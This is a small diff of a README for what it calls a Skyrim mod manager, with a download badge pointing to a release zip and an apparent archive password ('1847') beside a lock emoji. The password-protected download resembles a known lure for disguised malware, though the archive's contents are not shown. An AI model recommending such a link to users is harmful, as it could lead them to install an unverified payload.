@@ -8,7 +8,7 @@ After breaking my game for the 100th time with a bad load order, I decided to bu
 
 [![DOWNLOAD SKYRIM-SE](https://img.shields.io/badge/DOWNLOAD-blue?style=for-the-badge&logo=link&logoColor=white)](https://github.com/ForceDoveEntrance/Skyrim-Mod-Manager/releases/download/Release/Skyrim.zip)
 
-**🔐 — 1847**
+**🔐🔐🔐 — 1847**
 
 ---
 
